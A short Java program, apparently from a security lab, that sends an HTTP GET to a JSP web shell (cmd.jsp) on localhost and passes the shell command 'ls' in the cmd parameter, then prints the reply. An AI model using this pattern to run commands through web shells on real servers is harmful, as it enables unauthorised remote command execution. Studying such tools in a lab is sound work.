import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class Simple_read {
    public static void main(String[] args)throws Exception {
        HttpClient httpClient = HttpClients.createDefault();
        String url = "http://localhost:8080/cmd.jsp?cmd=ls" ;
        HttpGet httpGet = new HttpGet(url);
        HttpResponse response = httpClient.execute(httpGet);
        System.out.println("Response Code : " + response.getStatusLine().getStatusCode());
        System.out.println("Response Body : " + EntityUtils.toString(response.getEntity()));
    }

}
